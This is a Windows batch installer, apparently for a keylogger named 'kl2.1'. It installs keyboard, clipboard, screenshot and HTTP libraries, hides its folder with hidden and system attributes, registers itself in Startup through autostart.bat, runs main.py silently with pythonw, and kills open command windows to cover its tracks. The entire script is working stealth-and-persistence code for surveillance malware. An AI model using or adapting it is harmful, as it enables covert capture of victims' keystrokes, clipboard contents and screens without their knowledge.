@echo off
chcp 65001 >nul
goto banner

:banner
echo
echo  __  __     ______     __   __     ______     __  __    
echo/\ \_\ \   /\  ___\   /\ "-.\ \   /\  == \   /\ \_\ \   
echo\ \  __ \  \ \  __\   \ \ \-.  \  \ \  __<   \ \____ \  
echo \ \_\ \_\  \ \_____\  \ \_\\"\_\  \ \_\ \_\  \/\_____\ 
echo  \/_/\/_/   \/_____/   \/_/ \/_/   \/_/ /_/   \/_____/
echo
pause

cd C:\users\%USERNAME%\kl2.1

python --version > nul 2>&1
if %errorlevel% equ 0 (
    echo Python is installed.
) else (
    echo Python is not installed.
    pause
    exit
)

pip install requests
pip install pynput
pip install pyperclip
pip install pillow
pip install pyautogui

attrib +h +s "C:\users\%USERNAME%\kl2.1"

:: Run autostart.bat to add run.bat to Startup
call autostart.bat

start pythonw main.py
for /f "tokens=1" %%i in ('tasklist ^| findstr cmd.exe') do (
    if not "%%i" == "python.exe" taskkill /F /IM %%i
)
exit
